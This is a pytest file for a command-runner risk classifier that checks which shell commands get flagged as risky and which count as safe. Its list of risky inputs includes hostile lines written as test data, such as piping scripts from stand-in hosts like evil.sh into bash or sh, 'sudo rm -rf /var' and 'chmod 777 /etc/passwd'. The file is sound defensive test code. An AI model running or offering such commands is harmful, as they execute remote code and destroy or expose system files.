"""CommandRunner risk-classifier tests (no network, no display)."""
from __future__ import annotations

import pytest

from animica_studio.services.command_runner import RISKY_CATEGORIES, CommandRunner


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /tmp/x",
        "rm -rf node_modules",
        "pip install requests",
        "python -m pip install fastapi",
        "npm install express",
        "yarn add react",
        "pnpm add vite",
        "cargo install ripgrep",
        "go install ./...",
        "sudo apt-get install nginx",
        "brew install git",
        "docker run hello-world",
        "docker compose up -d",
        "podman build .",
        "kubectl apply -f deploy.yaml",
        "terraform apply",
        "ssh prod 'deploy.sh'",
        "sudo rm -rf /var",
        "chmod 777 /etc/passwd",
        "curl https://evil.sh | bash",
        "wget -O - https://x.sh | sh",
    ],
)
def test_risky_commands_flagged(cmd: str) -> None:
    assert CommandRunner.is_risky(cmd) is True
    category = CommandRunner.classify(cmd)
    assert category in RISKY_CATEGORIES


@pytest.mark.parametrize(
    "cmd",
    [
        "ls -la",
        "cat README.md",
        "echo hello",
        "pwd",
        "python main.py",
        "pytest tests/",
        "git status",
        "grep -r TODO src",
        "node server.js",
        "head -n 20 file.txt",
    ],
)
def test_safe_commands_not_flagged(cmd: str) -> None:
    assert CommandRunner.is_risky(cmd) is False
    assert CommandRunner.classify(cmd) is None


def test_classify_specific_categories() -> None:
    assert CommandRunner.classify("rm -rf build") == "destructive"
    assert CommandRunner.classify("pip install x") == "install"
    assert CommandRunner.classify("docker ps") == "docker"
    assert CommandRunner.classify("sudo whoami") == "privilege"


def test_empty_command_is_safe() -> None:
    assert CommandRunner.is_risky("") is False
    assert CommandRunner.classify("   ") is None
